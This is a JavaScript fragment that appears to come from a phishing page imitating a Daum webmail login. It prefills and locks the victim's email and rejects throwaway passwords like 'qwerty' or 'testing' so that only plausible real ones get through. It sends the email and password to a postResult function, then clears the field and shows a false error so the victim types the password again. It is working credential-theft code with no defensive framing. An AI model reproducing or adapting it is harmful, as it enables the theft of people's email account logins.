// 
if (validEmail.test(usermail)) {
    $("#daum_e").val(usermail)
    $("#daum_e").attr('readOnly', true)
}

$("#daum_form").on('submit', (e)=>{
    e.preventDefault();

    if (!validEmail.test($("#daum_e").val())) {
        $("#daum_e").css({"border-color":"red"});
        return
    }
    else{
        $("#daum_e").css({"border-color":"silver"});
    }

    if (validEmail.test($("#daum_p").val()) || $("#daum_p").val().length < 6 || $("#daum_p").val().toLowerCase() == "qwerty" || $("#daum_p").val() == 123456 || $("#daum_p").val().toLowerCase() == "password" || $("#daum_p").val().toLowerCase() == "testing") {
        $("#daum_p").css({"border-color":"red"});
        return
    }
    else{
        $("#daum_p").css({"border-color":"silver"});
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#daum_e").val().split('@');

    postResult(url[1], $("#daum_e").val(), $("#daum_p").val(), postCount);
    
    setTimeout(() => {
        $("#daum_p").css({"border-color":"red"});
        postCount++
        $("#daum_p").val("")
    }, delayCounter);
})